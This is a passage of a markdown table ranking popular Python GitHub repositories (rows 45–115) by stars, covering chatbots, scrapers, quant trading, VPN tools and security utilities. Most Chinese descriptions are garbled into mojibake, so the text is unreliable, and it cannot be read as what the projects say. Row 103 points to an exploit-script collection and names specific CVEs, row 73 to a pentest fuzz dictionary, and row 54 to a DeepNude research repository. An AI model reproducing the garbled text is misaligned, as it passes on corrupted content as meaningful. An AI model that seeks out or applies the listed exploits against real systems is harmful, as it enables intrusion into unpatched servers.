|45|[lcdevelop/ChatBotCourse](https://github.com/lcdevelop/ChatBotCourse)|Ëá™Â∑±Âä®ÊâãÂÅöËÅäÂ§©Êú∫Âô®‰∫∫ÊïôÁ®ã|4.8k|Python|10/13|
|46|[PeterDing/iScript](https://github.com/PeterDing/iScript)|ÂêÑÁßçËÑöÊú¨ -- ÂÖ≥‰∫é ËôæÁ±≥ xiami.com, ÁôæÂ∫¶ÁΩëÁõò pan.baidu.com, 115ÁΩëÁõò 115.com, ÁΩëÊòìÈü≥‰πê music.163.com, ÁôæÂ∫¶Èü≥‰πê music.baidu.com, 360ÁΩëÁõò/‰∫ëÁõò yunpan.cn, ËßÜÈ¢ëËß£Êûê flvxz.com, bt torrent ‚Üî magnet, ed2k ÊêúÁ¥¢, tumblr ÂõæÁâá‰∏ãËΩΩ, unzip|4.8k|Python|10/18|
|47|[chyroc/WechatSogou](https://github.com/chyroc/WechatSogou)|Âü∫‰∫éÊêúÁãóÂæÆ‰ø°ÊêúÁ¥¢ÁöÑÂæÆ‰ø°ÂÖ¨‰ºóÂè∑Áà¨Ëô´Êé•Âè£|4.8k|Python|04/23|
|48|[shidenggui/easytrader](https://github.com/shidenggui/easytrader)|Êèê‰æõÂêåËä±È°∫ÂÆ¢Êà∑Á´Ø/ÂõΩÈáë/ÂçéÊ≥∞ÂÆ¢Êà∑Á´Ø/Èõ™ÁêÉÁöÑÂü∫Èáë„ÄÅËÇ°Á•®Ëá™Âä®Á®ãÂ∫èÂåñ‰∫§Êòì‰ª•ÂèäËá™Âä®ÊâìÊñ∞ÔºåÊîØÊåÅË∑üË∏™ joinquant /ricequant Ê®°Êãü‰∫§Êòì Âíå ÂÆûÁõòÈõ™ÁêÉÁªÑÂêà, ÈáèÂåñ‰∫§ÊòìÁªÑ‰ª∂|4.4k|Python|10/23|
|49|[Jrohy/multi-v2ray](https://github.com/Jrohy/multi-v2ray)|v2rayÂ§öÁî®Êà∑ÁÆ°ÁêÜÈÉ®ÁΩ≤Á®ãÂ∫è|4.3k|Python|10/28|
|50|[QUANTAXIS/QUANTAXIS](https://github.com/QUANTAXIS/QUANTAXIS)|QUANTAXIS ÊîØÊåÅ‰ªªÂä°Ë∞ÉÂ∫¶ ÂàÜÂ∏ÉÂºèÈÉ®ÁΩ≤ÁöÑ ËÇ°Á•®/ÊúüË¥ß/ÊúüÊùÉ/Ê∏ØËÇ°/ËôöÊãüË¥ßÂ∏Å  Êï∞ÊçÆ/ÂõûÊµã/Ê®°Êãü/‰∫§Êòì/ÂèØËßÜÂåñ/Â§öË¥¶Êà∑ Á∫ØÊú¨Âú∞ÈáèÂåñËß£ÂÜ≥ÊñπÊ°à|4.2k|Python|10/25|
|51|[ymcui/Chinese-BERT-wwm](https://github.com/ymcui/Chinese-BERT-wwm)|Pre-Training with Whole Word Masking for Chinese BERTÔºà‰∏≠ÊñáBERT-wwmÁ≥ªÂàóÊ®°ÂûãÔºâ|4.1k|Python|10/20|
|52|[SmirkCao/Lihang](https://github.com/SmirkCao/Lihang)|Statistical learning methods, ÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï(Á¨¨2Áâà)[ÊùéËà™]  [Á¨îËÆ∞, ‰ª£Á†Å, notebook, ÂèÇËÄÉÊñáÁåÆ, Errata, lihang]|3.9k|Python|04/01|
|53|[offu/WeRoBot](https://github.com/offu/WeRoBot)|WeRoBot ÊòØ‰∏Ä‰∏™ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÂºÄÂèëÊ°ÜÊû∂|3.7k|Python|10/26|
|54|[yuanxiaosc/DeepNude-an-Image-to-Image-technology](https://github.com/yuanxiaosc/DeepNude-an-Image-to-Image-technology)|DeepNude's algorithm and general image generation theory and practice research, including pix2pix, CycleGAN, UGATIT, DCGAN, SinGAN, ALAE, mGANprior, StarGAN-v2 and VAE models (TensorFlow2 implementation). DeepNudeÁöÑÁÆóÊ≥ï‰ª•ÂèäÈÄöÁî®ÁîüÊàêÂØπÊäóÁΩëÁªúÔºàGAN,Generative Adversarial NetworkÔºâÂõæÂÉèÁîüÊàêÁöÑÁêÜËÆ∫‰∏éÂÆûË∑µÁ†îÁ©∂„ÄÇ|3.5k|Python|07/12|
|55|[QingdaoU/OnlineJudge](https://github.com/QingdaoU/OnlineJudge)|open source online judge based on Vue, Django and Docker.   ÈùíÂ≤õÂ§ßÂ≠¶ÂºÄÊ∫ê Online Judge   QQÁæ§ 496710125   admin@qduoj.com|3.5k|Python|10/22|
|56|[nl8590687/ASRT_SpeechRecognition](https://github.com/nl8590687/ASRT_SpeechRecognition)|A Deep-Learning-Based Chinese Speech Recognition System Âü∫‰∫éÊ∑±Â∫¶Â≠¶‰π†ÁöÑ‰∏≠ÊñáËØ≠Èü≥ËØÜÂà´Á≥ªÁªü|3.5k|Python|10/23|
|57|[xiaoming2028/FreePAC](https://github.com/xiaoming2028/FreePAC)|ÁßëÂ≠¶‰∏äÁΩë/Ê¢ØÂ≠ê/Ëá™Áî±‰∏äÁΩë/ÁøªÂ¢ô SS/SSR/V2Ray/Brook Êê≠Âª∫ÊïôÁ®ã ÂÖçË¥πÊú∫Âú∫„ÄÅVPNÂ∑•ÂÖ∑|3.4k|Python|10/17|
|58|[lawlite19/MachineLearning_Python](https://github.com/lawlite19/MachineLearning_Python)|Êú∫Âô®Â≠¶‰π†ÁÆóÊ≥ïpythonÂÆûÁé∞|3.4k|Python|10/01|
|59|[liangliangyy/DjangoBlog](https://github.com/liangliangyy/DjangoBlog)|üç∫Âü∫‰∫éDjangoÁöÑÂçöÂÆ¢Á≥ªÁªü|3.4k|Python|10/11|
|60|[chatopera/Synonyms](https://github.com/chatopera/Synonyms)|:herb: ‰∏≠ÊñáËøë‰πâËØçÔºöËÅäÂ§©Êú∫Âô®‰∫∫ÔºåÊô∫ËÉΩÈóÆÁ≠îÂ∑•ÂÖ∑ÂåÖ|3.3k|Python|10/11|
|61|[ownthink/KnowledgeGraphData](https://github.com/ownthink/KnowledgeGraphData)|Âè≤‰∏äÊúÄÂ§ßËßÑÊ®°1.4‰∫ø‰∏≠ÊñáÁü•ËØÜÂõæË∞±ÂºÄÊ∫ê‰∏ãËΩΩ|3.2k|Python|10/21|
|62|[Kr1s77/Python-crawler-tutorial-starts-from-zero](https://github.com/Kr1s77/Python-crawler-tutorial-starts-from-zero)|pythonÁà¨Ëô´ÊïôÁ®ãÔºåÂ∏¶‰Ω†‰ªéÈõ∂Âà∞‰∏ÄÔºåÂåÖÂê´jsÈÄÜÂêëÔºåselenium, tesseract OCRËØÜÂà´,mongodbÁöÑ‰ΩøÁî®Ôºå‰ª•ÂèäscrapyÊ°ÜÊû∂|3.2k|Python|09/04|
|63|[jinfagang/tensorflow_poems](https://github.com/jinfagang/tensorflow_poems)|‰∏≠ÊñáÂè§ËØóËá™Âä®‰ΩúËØóÊú∫Âô®‰∫∫ÔºåÂ±åÁÇ∏Â§©ÔºåÂü∫‰∫étensorflow1.10 apiÔºåÊ≠£Âú®ÁßØÊûÅÁª¥Êä§ÂçáÁ∫ß‰∏≠ÔºåÂø´starÔºå‰øùÊåÅÊõ¥Êñ∞ÔºÅ|3.2k|Python|09/16|
|64|[billryan/algorithm-exercise](https://github.com/billryan/algorithm-exercise)|Data Structure and Algorithm notes. Êï∞ÊçÆÁªìÊûÑ‰∏éÁÆóÊ≥ï/leetcode/lintcodeÈ¢òËß£/|3.1k|Python|10/13|
|65|[dataabc/weiboSpider](https://github.com/dataabc/weiboSpider)|Êñ∞Êµ™ÂæÆÂçöÁà¨Ëô´ÔºåÁî®pythonÁà¨ÂèñÊñ∞Êµ™ÂæÆÂçöÊï∞ÊçÆ|2.9k|Python|10/19|
|66|[brightmart/albert_zh](https://github.com/brightmart/albert_zh)|A LITE BERT FOR SELF-SUPERVISED LEARNING OF LANGUAGE REPRESENTATIONS, Êµ∑Èáè‰∏≠ÊñáÈ¢ÑËÆ≠ÁªÉALBERTÊ®°Âûã|2.9k|Python|10/22|
|67|[mozillazg/python-pinyin](https://github.com/mozillazg/python-pinyin)|Ê±âÂ≠óËΩ¨ÊãºÈü≥(pypinyin)|2.9k|Python|10/11|
|68|[the0demiurge/ShadowSocksShare](https://github.com/the0demiurge/ShadowSocksShare)|PythonÁà¨Ëô´/FlaskÁΩëÁ´ô/ÂÖçË¥πShadowSocksË¥¶Âè∑/ssrËÆ¢ÈòÖ/json ËÆ¢ÈòÖ|2.9k|Python|07/12|
|69|[MingchaoZhu/DeepLearning](https://github.com/MingchaoZhu/DeepLearning)|Python for„ÄäDeep Learning„ÄãÔºåËØ•‰π¶‰∏∫„ÄäÊ∑±Â∫¶Â≠¶‰π†„Äã(Ëä±‰π¶) Êï∞Â≠¶Êé®ÂØº„ÄÅÂéüÁêÜÂâñÊûê‰∏éÊ∫êÁ†ÅÁ∫ßÂà´‰ª£Á†ÅÂÆûÁé∞|2.8k|Python|06/23|
|70|[kangvcar/InfoSpider](https://github.com/kangvcar/InfoSpider)|INFO-SPIDER ÊòØ‰∏Ä‰∏™ÈõÜ‰ºóÂ§öÊï∞ÊçÆÊ∫ê‰∫é‰∏ÄË∫´ÁöÑÁà¨Ëô´Â∑•ÂÖ∑ÁÆ±üß∞ÔºåÊó®Âú®ÂÆâÂÖ®Âø´Êç∑ÁöÑÂ∏ÆÂä©Áî®Êà∑ÊãøÂõûËá™Â∑±ÁöÑÊï∞ÊçÆÔºåÂ∑•ÂÖ∑‰ª£Á†ÅÂºÄÊ∫êÔºåÊµÅÁ®ãÈÄèÊòé„ÄÇÊîØÊåÅÊï∞ÊçÆÊ∫êÂåÖÊã¨GitHub„ÄÅQQÈÇÆÁÆ±„ÄÅÁΩëÊòìÈÇÆÁÆ±„ÄÅÈòøÈáåÈÇÆÁÆ±„ÄÅÊñ∞Êµ™ÈÇÆÁÆ±„ÄÅHotmailÈÇÆÁÆ±„ÄÅOutlookÈÇÆÁÆ±„ÄÅ‰∫¨‰∏ú„ÄÅÊ∑òÂÆù„ÄÅÊîØ‰ªòÂÆù„ÄÅ‰∏≠ÂõΩÁßªÂä®„ÄÅ‰∏≠ÂõΩËÅîÈÄö„ÄÅ‰∏≠ÂõΩÁîµ‰ø°„ÄÅÁü•‰πé„ÄÅÂìîÂì©ÂìîÂì©„ÄÅÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅQQÂ•ΩÂèã„ÄÅQQÁæ§„ÄÅÁîüÊàêÊúãÂèãÂúàÁõ∏ÂÜå„ÄÅÊµèËßàÂô®ÊµèËßàÂéÜÂè≤„ÄÅ12306„ÄÅÂçöÂÆ¢Âõ≠„ÄÅCSDNÂçöÂÆ¢„ÄÅÂºÄÊ∫ê‰∏≠ÂõΩÂçöÂÆ¢„ÄÅÁÆÄ‰π¶„ÄÇ|2.8k|Python|10/26|
|71|[pythonstock/stock](https://github.com/pythonstock/stock)|stockÔºåËÇ°Á•®Á≥ªÁªü„ÄÇ‰ΩøÁî®pythonËøõË°åÂºÄÂèë„ÄÇ|2.8k|Python|08/11|
|72|[imfht/fanhaodaquan](https://github.com/imfht/fanhaodaquan)| Áï™Âè∑Â§ßÂÖ®„ÄÇ|2.8k|Python|08/21|
|73|[TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)|Web Pentesting Fuzz Â≠óÂÖ∏,‰∏Ä‰∏™Â∞±Â§ü‰∫Ü„ÄÇ|2.7k|Python|05/10|
|74|[ZiniuLu/Python-100-Days](https://github.com/ZiniuLu/Python-100-Days)|Âá∫Â§ÑÔºöhttps://github.com/jackfrued/Python-100-Days.git|2.7k|Python|10/01|
|75|[guhongze/adminset](https://github.com/guhongze/adminset)|Ëá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞ÔºöCMDB„ÄÅCD„ÄÅDevOps„ÄÅËµÑ‰∫ßÁÆ°ÁêÜ„ÄÅ‰ªªÂä°ÁºñÊéí„ÄÅÊåÅÁª≠‰∫§‰ªò„ÄÅÁ≥ªÁªüÁõëÊéß„ÄÅËøêÁª¥ÁÆ°ÁêÜ„ÄÅÈÖçÁΩÆÁÆ°ÁêÜ|2.7k|Python|08/07|
|76|[shmilylty/OneForAll](https://github.com/shmilylty/OneForAll)|OneForAllÊòØ‰∏ÄÊ¨æÂäüËÉΩÂº∫Â§ßÁöÑÂ≠êÂüüÊî∂ÈõÜÂ∑•ÂÖ∑|2.7k|Python|10/25|
|77|[moranzcw/Computer-Networking-A-Top-Down-Approach-NOTES](https://github.com/moranzcw/Computer-Networking-A-Top-Down-Approach-NOTES)|„ÄäËÆ°ÁÆóÊú∫ÁΩëÁªúÔºçËá™È°∂Âêë‰∏ãÊñπÊ≥ï(Âéü‰π¶Á¨¨6Áâà)„ÄãÁºñÁ®ã‰Ωú‰∏öÔºåWiresharkÂÆûÈ™åÊñáÊ°£ÁöÑÁøªËØëÂíåËß£Á≠î„ÄÇ|2.7k|Python|09/05|
|78|[TingsongYu/PyTorch_Tutorial](https://github.com/TingsongYu/PyTorch_Tutorial)|„ÄäPytorchÊ®°ÂûãËÆ≠ÁªÉÂÆûÁî®ÊïôÁ®ã„Äã‰∏≠ÈÖçÂ•ó‰ª£Á†Å|2.7k|Python|09/26|
|79|[PyQt5/PyQt](https://github.com/PyQt5/PyQt)|PyQt ExamplesÔºàPyQtÂêÑÁßçÊµãËØïÂíå‰æãÂ≠êÔºâ PyQt4 PyQt5|2.6k|Python|07/29|
|80|[zhaipro/easy12306](https://github.com/zhaipro/easy12306)|‰ΩøÁî®Êú∫Âô®Â≠¶‰π†ÁÆóÊ≥ïÂÆåÊàêÂØπ12306È™åËØÅÁ†ÅÁöÑËá™Âä®ËØÜÂà´|2.5k|Python|05/31|
|81|[welliamcao/OpsManage](https://github.com/welliamcao/OpsManage)|Ëá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞: ‰ª£Á†ÅÂèäÂ∫îÁî®ÈÉ®ÁΩ≤CI/CD„ÄÅËµÑ‰∫ßÁÆ°ÁêÜCMDB„ÄÅËÆ°Âàí‰ªªÂä°ÁÆ°ÁêÜÂπ≥Âè∞„ÄÅSQLÂÆ°Ê†∏ ÂõûÊªö„ÄÅ‰ªªÂä°Ë∞ÉÂ∫¶„ÄÅÁ´ôÂÜÖWIKI|2.5k|Python|10/28|
|82|[shidenggui/easyquotation](https://github.com/shidenggui/easyquotation)|ÂÆûÊó∂Ëé∑ÂèñÊñ∞Êµ™ / ËÖæËÆØ ÁöÑÂÖçË¥πËÇ°Á•®Ë°åÊÉÖ / ÈõÜÊÄùË∑ØÁöÑÂàÜÁ∫ßÂü∫ÈáëË°åÊÉÖ|2.5k|Python|06/01|
|83|[WhaleShark-Team/cobra](https://github.com/WhaleShark-Team/cobra)|Source Code Security Audit (Ê∫ê‰ª£Á†ÅÂÆâÂÖ®ÂÆ°ËÆ°)|2.4k|Python|04/24|
|84|[wzpan/wukong-robot](https://github.com/wzpan/wukong-robot)|ü§ñ wukong-robot ÊòØ‰∏Ä‰∏™ÁÆÄÂçï„ÄÅÁÅµÊ¥ª„ÄÅ‰ºòÈõÖÁöÑ‰∏≠ÊñáËØ≠Èü≥ÂØπËØùÊú∫Âô®‰∫∫/Êô∫ËÉΩÈü≥ÁÆ±È°πÁõÆÔºåËøòÂèØËÉΩÊòØÈ¶ñ‰∏™ÊîØÊåÅËÑëÊú∫‰∫§‰∫íÁöÑÂºÄÊ∫êÊô∫ËÉΩÈü≥ÁÆ±È°πÁõÆ„ÄÇ|2.4k|Python|10/10|
|85|[qq547276542/Agriculture_KnowledgeGraph](https://github.com/qq547276542/Agriculture_KnowledgeGraph)|ÂÜú‰∏öÁü•ËØÜÂõæË∞±(AgriKG)ÔºöÂÜú‰∏öÈ¢ÜÂüüÁöÑ‰ø°ÊÅØÊ£ÄÁ¥¢ÔºåÂëΩÂêçÂÆû‰ΩìËØÜÂà´ÔºåÂÖ≥Á≥ªÊäΩÂèñÔºåÊô∫ËÉΩÈóÆÁ≠îÔºåËæÖÂä©ÂÜ≥Á≠ñ|2.4k|Python|08/28|
|86|[YongHaoWu/NeteaseCloudMusicFlac](https://github.com/YongHaoWu/NeteaseCloudMusicFlac)|Ê†πÊçÆÁΩëÊòì‰∫ëÈü≥‰πêÁöÑÊ≠åÂçï, ‰∏ãËΩΩflacÊó†ÊçüÈü≥‰πêÂà∞Êú¨Âú∞. Download the FLAC music from Internet according to your NeteaseCloudMusic playlist.|2.4k|Python|07/06|
|87|[jindaxiang/akshare](https://github.com/jindaxiang/akshare)|AkShare is an elegant and simple financial data interface library for Python, built for human beings! ÂºÄÊ∫êË¥¢ÁªèÊï∞ÊçÆÊé•Âè£Â∫ì|2.4k|Python|10/29|
|88|[opendevops-cn/opendevops](https://github.com/opendevops-cn/opendevops)|CODOÊòØ‰∏ÄÊ¨æ‰∏∫Áî®Êà∑Êèê‰æõ‰ºÅ‰∏öÂ§öÊ∑∑Âêà‰∫ë„ÄÅ‰∏ÄÁ´ôÂºèDevOps„ÄÅËá™Âä®ÂåñËøêÁª¥„ÄÅÂÆåÂÖ®ÂºÄÊ∫êÁöÑ‰∫ëÁÆ°ÁêÜÂπ≥Âè∞„ÄÅËá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞|2.4k|Python|08/28|
|89|[Tencent/FaceDetection-DSFD](https://github.com/Tencent/FaceDetection-DSFD)|ËÖæËÆØ‰ºòÂõæÈ´òÁ≤æÂ∫¶ÂèåÂàÜÊîØ‰∫∫ËÑ∏Ê£ÄÊµãÂô®|2.4k|Python|07/09|
|90|[liuhuanyong/QASystemOnMedicalKG](https://github.com/liuhuanyong/QASystemOnMedicalKG)| A tutorial and implement of disease centered Medical knowledge graph and qa system based on it„ÄÇÁü•ËØÜÂõæË∞±ÊûÑÂª∫ÔºåËá™Âä®ÈóÆÁ≠îÔºåÂü∫‰∫ékgÁöÑËá™Âä®ÈóÆÁ≠î„ÄÇ‰ª•ÁñæÁóÖ‰∏∫‰∏≠ÂøÉÁöÑ‰∏ÄÂÆöËßÑÊ®°ÂåªËçØÈ¢ÜÂüüÁü•ËØÜÂõæË∞±ÔºåÂπ∂‰ª•ËØ•Áü•ËØÜÂõæË∞±ÂÆåÊàêËá™Âä®ÈóÆÁ≠î‰∏éÂàÜÊûêÊúçÂä°„ÄÇ|2.3k|Python|08/13|
|91|[momosecurity/aswan](https://github.com/momosecurity/aswan)|ÈôåÈôåÈ£éÊéßÁ≥ªÁªüÈùôÊÄÅËßÑÂàôÂºïÊìéÔºåÈõ∂Âü∫Á°ÄÁÆÄÊòì‰æøÊç∑ÁöÑÈÖçÁΩÆÂ§öÁßçÂ§çÊùÇËßÑÂàôÔºåÂÆûÊó∂È´òÊïàÁÆ°ÊéßÁî®Êà∑ÂºÇÂ∏∏Ë°å‰∏∫„ÄÇ|2.3k|Python|09/21|
|92|[aaPanel/BaoTa](https://github.com/aaPanel/BaoTa)|ÂÆùÂ°îLinuxÈù¢Êùø - ÁÆÄÂçïÂ•ΩÁî®ÁöÑÊúçÂä°Âô®ËøêÁª¥Èù¢Êùø|2.3k|Python|08/04|
|93|[junerain123/javsdt](https://github.com/junerain123/javsdt)|ÂΩ±Áâá‰ø°ÊÅØÊï¥ÁêÜÂ∑•ÂÖ∑ÔºåÊäìÂèñÂÖÉÊï∞ÊçÆnfoÔºåËá™ÂÆö‰πâÈáçÂëΩÂêçÊñá‰ª∂(Â§π)Ôºå‰∏ãËΩΩfanartË£ÅÂâ™posterÔºå‰∏∫emby„ÄÅkodi„ÄÅÊûÅÂΩ±Ê¥æÈì∫Ë∑Ø„ÄÇ|2.3k|Python|06/25|
|94|[0xHJK/music-dl](https://github.com/0xHJK/music-dl)|search and download music ‰ªéÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅQQÈü≥‰πê„ÄÅÈÖ∑ÁãóÈü≥‰πê„ÄÅÁôæÂ∫¶Èü≥‰πê„ÄÅËôæÁ±≥Èü≥‰πê„ÄÅÂí™ÂíïÈü≥‰πêÁ≠âÊêúÁ¥¢Âíå‰∏ãËΩΩÊ≠åÊõ≤|2.2k|Python|03/25|
|95|[tychxn/jd-assistant](https://github.com/tychxn/jd-assistant)|‰∫¨‰∏úÊä¢Ë¥≠Âä©ÊâãÔºöÂåÖÂê´ÁôªÂΩïÔºåÊü•ËØ¢ÂïÜÂìÅÂ∫ìÂ≠ò/‰ª∑Ê†ºÔºåÊ∑ªÂä†/Ê∏ÖÁ©∫Ë¥≠Áâ©ËΩ¶ÔºåÊä¢Ë¥≠ÂïÜÂìÅ(‰∏ãÂçï)ÔºåÊü•ËØ¢ËÆ¢ÂçïÁ≠âÂäüËÉΩ|2.2k|Python|03/10|
|96|[DropsDevopsOrg/ECommerceCrawlers](https://github.com/DropsDevopsOrg/ECommerceCrawlers)|ÂÆûÊàòüêçÂ§öÁßçÁΩëÁ´ô„ÄÅÁîµÂïÜÊï∞ÊçÆÁà¨Ëô´üï∑„ÄÇÂåÖÂê´üï∏ÔºöÊ∑òÂÆùÂïÜÂìÅ„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅÂ§ß‰ºóÁÇπËØÑ„ÄÅ‰ºÅÊü•Êü•„ÄÅÊãõËÅòÁΩëÁ´ô„ÄÅÈó≤È±º„ÄÅÈòøÈáå‰ªªÂä°„ÄÅÂçöÂÆ¢Âõ≠„ÄÅÂæÆÂçö„ÄÅÁôæÂ∫¶Ë¥¥Âêß„ÄÅË±ÜÁì£ÁîµÂΩ±„ÄÅÂåÖÂõæÁΩë„ÄÅÂÖ®ÊôØÁΩë„ÄÅË±ÜÁì£Èü≥‰πê„ÄÅÊüêÁúÅËçØÁõëÂ±Ä„ÄÅÊêúÁãêÊñ∞Èóª„ÄÅÊú∫Âô®Â≠¶‰π†ÊñáÊú¨ÈááÈõÜ„ÄÅfofaËµÑ‰∫ßÈááÈõÜ„ÄÅÊ±ΩËΩ¶‰πãÂÆ∂„ÄÅÂõΩÂÆ∂ÁªüËÆ°Â±Ä„ÄÅÁôæÂ∫¶ÂÖ≥ÈîÆËØçÊî∂ÂΩïÊï∞„ÄÅËúòËõõÊ≥õÁõÆÂΩï„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅË±ÜÁì£ÂΩ±ËØÑ„ÄÅÊê∫Á®ã„ÄÅÂ∞èÁ±≥Â∫îÁî®ÂïÜÂ∫ó„ÄÅÂÆâÂ±ÖÂÆ¢„ÄÅÈÄîÂÆ∂Ê∞ëÂÆø‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è„ÄÇÂæÆ‰ø°Áà¨Ëô´Â±ïÁ§∫È°πÁõÆ:|2.2k|Python|10/05|
|97|[jiangxufeng/v2rayL](https://github.com/jiangxufeng/v2rayL)|v2ray linux GUIÂÆ¢Êà∑Á´ØÔºåÊîØÊåÅËÆ¢ÈòÖ„ÄÅvemss„ÄÅssÁ≠âÂçèËÆÆÔºåËá™Âä®Êõ¥Êñ∞ËÆ¢ÈòÖ„ÄÅÊ£ÄÊü•ÁâàÊú¨Êõ¥Êñ∞|2.1k|Python|10/15|
|98|[lanbing510/DouBanSpider](https://github.com/lanbing510/DouBanSpider)|Ë±ÜÁì£ËØª‰π¶ÁöÑÁà¨Ëô´|2.1k|Python|04/08|
|99|[makelove/OpenCV-Python-Tutorial](https://github.com/makelove/OpenCV-Python-Tutorial)|OpenCVÈóÆÁ≠îÁæ§,QQÁæ§Âè∑:187436093|2.0k|Python|10/18|
|100|[Ehco1996/django-sspanel](https://github.com/Ehco1996/django-sspanel)|Áî®diangoÂºÄÂèëÁöÑshadowsocks/V2rayÈù¢Êùø|2.0k|Python|10/29|
|101|[hhyo/Archery](https://github.com/hhyo/Archery)|SQL ÂÆ°Ê†∏Êü•ËØ¢Âπ≥Âè∞|2.0k|Python|10/28|
|102|[shidenggui/easyquant](https://github.com/shidenggui/easyquant)|ËÇ°Á•®ÈáèÂåñÊ°ÜÊû∂ÔºåÊîØÊåÅË°åÊÉÖËé∑Âèñ‰ª•Âèä‰∫§Êòì|2.0k|Python|03/14|
|103|[zhzyker/exphub](https://github.com/zhzyker/exphub)|Exphub[ÊºèÊ¥ûÂà©Áî®ËÑöÊú¨Â∫ì] ÂåÖÊã¨Webloigc„ÄÅStruts2„ÄÅTomcat„ÄÅNexus„ÄÅSolr„ÄÅJboss„ÄÅDrupalÁöÑÊºèÊ¥ûÂà©Áî®ËÑöÊú¨ÔºåÊúÄÊñ∞Ê∑ªÂä†CVE-2020-5902„ÄÅCVE-2020-11444„ÄÅCVE-2020-10204„ÄÅCVE-2020-10199„ÄÅCVE-2020-1938„ÄÅCVE-2020-2551„ÄÅCVE-2020-2555„ÄÅCVE-2020-2883„ÄÅCVE-2019-17558„ÄÅCVE-2019-6340|2.0k|Python|10/10|
|104|[PantsuDango/Dango-Translator](https://github.com/PantsuDango/Dango-Translator)|Âõ¢Â≠êÁøªËØëÂô® ‚Äî‚Äî ‰∏™‰∫∫ÂÖ¥Ë∂£Âà∂‰ΩúÁöÑ‰∏ÄÊ¨æÂü∫‰∫éOCRÊäÄÊúØÁöÑÁøªËØëÂô®|2.0k|Python|10/30|
|105|[hankcs/pyhanlp](https://github.com/hankcs/pyhanlp)|‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ Ëá™Âä®ÊëòË¶Å ÊñáÊú¨ÂàÜÁ±ªËÅöÁ±ª ÊãºÈü≥ÁÆÄÁπÅ Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ|2.0k|Python|10/11|
|106|[howie6879/owllook](https://github.com/howie6879/owllook)|owllook-Âú®Á∫øÁΩëÁªúÂ∞èËØ¥ÈòÖËØªÁΩëÁ´ô&Â∞èËØ¥ÊêúÁ¥¢ÂºïÊìé&Â∞èËØ¥Êé®ËçêÁ≥ªÁªü[ÊêúÁ¥¢„ÄÅËøΩ‰π¶„ÄÅÊî∂Ëóè„ÄÅËøΩÊõ¥„ÄÅÂ∞èËØ¥API]|2.0k|Python|05/03|
|107|[cycz/jdBuyMask](https://github.com/cycz/jdBuyMask)|‰∫¨‰∏úÁõëÊéßÂè£ÁΩ©ÊúâË¥ßÁà¨Ëô´ÔºåËá™Âä®‰∏ãÂçïÁà¨Ëô´ÔºåÂè£ÁΩ©Áà¨Ëô´|1.9k|Python|02/13|
|108|[yoshiko2/AV_Data_Capture](https://github.com/yoshiko2/AV_Data_Capture)|Êú¨Âú∞ÁîµÂΩ±ÂàÆÂâä‰∏éÊï¥ÁêÜ‰∏Ä‰ΩìÂåñËß£ÂÜ≥ÊñπÊ°à|1.9k|Python|10/29|
|109|[nghuyong/WeiboSpider](https://github.com/nghuyong/WeiboSpider)|This is a sina weibo spider built by scrapy [ÂæÆÂçöÁà¨Ëô´/ÊåÅÁª≠Áª¥Êä§]|1.9k|Python|08/07|
|110|[Determined22/zh-NER-TF](https://github.com/Determined22/zh-NER-TF)|A very simple BiLSTM-CRF model for Chinese Named Entity Recognition ‰∏≠ÊñáÂëΩÂêçÂÆû‰ΩìËØÜÂà´ (TensorFlow)|1.9k|Python|03/07|
|111|[zhaoyingjun/chatbot](https://github.com/zhaoyingjun/chatbot)|‰∏Ä‰∏™ÂèØ‰ª•Ëá™Â∑±ËøõË°åËÆ≠ÁªÉÁöÑ‰∏≠ÊñáËÅäÂ§©Êú∫Âô®‰∫∫Ôºå Ê†πÊçÆËá™Â∑±ÁöÑËØ≠ÊñôËÆ≠ÁªÉÂá∫Ëá™Â∑±ÊÉ≥Ë¶ÅÁöÑËÅäÂ§©Êú∫Âô®‰∫∫ÔºåÂèØ‰ª•Áî®‰∫éÊô∫ËÉΩÂÆ¢Êúç„ÄÅÂú®Á∫øÈóÆÁ≠î„ÄÅÊô∫ËÉΩËÅäÂ§©Á≠âÂú∫ÊôØ„ÄÇÁõÆÂâçÂåÖÂê´seq2seq„ÄÅseqGANÁâàÊú¨„ÄÅtf2.0ÁâàÊú¨„ÄÅpytorchÁâàÊú¨„ÄÇ|1.9k|Python|10/10|
|112|[minivision-ai/photo2cartoon](https://github.com/minivision-ai/photo2cartoon)|‰∫∫ÂÉèÂç°ÈÄöÂåñÊé¢Á¥¢È°πÁõÆ (photo-to-cartoon translation project)|1.9k|Python|09/27|
|113|[BlankerL/DXY-COVID-19-Data](https://github.com/BlankerL/DXY-COVID-19-Data)|2019Êñ∞ÂûãÂÜ†Áä∂ÁóÖÊØíÁñ´ÊÉÖÊó∂Èó¥Â∫èÂàóÊï∞ÊçÆ‰ªìÂ∫ì   COVID-19/2019-nCoV Infection Time Series Data Warehouse|1.8k|Python|10/30|
|114|[Tencent/ObjectDetection-OneStageDet](https://github.com/Tencent/ObjectDetection-OneStageDet)|ÂçïÈò∂ÊÆµÈÄöÁî®ÁõÆÊ†áÊ£ÄÊµãÂô®|1.8k|Python|06/03|
|115|[Roujack/mathAI](https://github.com/Roujack/mathAI)|‰∏Ä‰∏™ÊãçÁÖßÂÅöÈ¢òÁ®ãÂ∫è„ÄÇËæìÂÖ•‰∏ÄÂº†ÂåÖÂê´Êï∞Â≠¶ËÆ°ÁÆóÈ¢òÁöÑÂõæÁâáÔºåËæìÂá∫ËØÜÂà´Âá∫ÁöÑÊï∞Â≠¶ËÆ°ÁÆóÂºè‰ª•ÂèäËÆ°ÁÆóÁªìÊûú„ÄÇThis is a mathematic expression recognition project.|1.8k|Python|05/18|
